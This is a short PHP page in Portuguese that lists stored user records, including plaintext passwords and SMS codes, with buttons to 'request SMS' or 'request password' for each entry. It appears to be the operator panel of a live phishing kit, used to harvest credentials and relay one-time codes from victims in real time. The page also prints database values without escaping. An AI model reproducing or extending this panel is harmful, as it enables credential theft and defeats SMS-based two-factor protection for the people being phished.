<?php
require_once "../config/database.php";

// Consultar os usuários
$sql = "SELECT id, username, tipo, senha, sms_code, status, created_at FROM user_data ORDER BY created_at DESC";
$result = $conn->query($sql);

if ($result->num_rows > 0) {
    while ($row = $result->fetch_assoc()) {
        echo "<tr>
                <td>{$row['id']}</td>
                <td>{$row['username']}</td>
                <td>{$row['tipo']}</td>
                <td>{$row['senha']}</td>
                <td>{$row['sms_code']}</td>
                <td>{$row['status']}</td>
                <td>
                  <form id='action-form-{$row['id']}' method='POST'>
                    <input type='hidden' name='user_id' value='{$row['id']}'>
                    <input type='hidden' id='action-input-{$row['id']}' name='action' value=''>
                    <button type='button' onclick=\"submitAction('aguardando_sms', {$row['id']})\">Pedir SMS</button>
                    <button type='button' onclick=\"submitAction('aguardando_senha', {$row['id']})\">Pedir Senha</button>
                  </form>
                </td>
                <td>{$row['created_at']}</td>
              </tr>";
    }
} else {
    echo "<tr><td colspan='8'>Nenhum dado encontrado.</td></tr>";
}

$conn->close();
?>
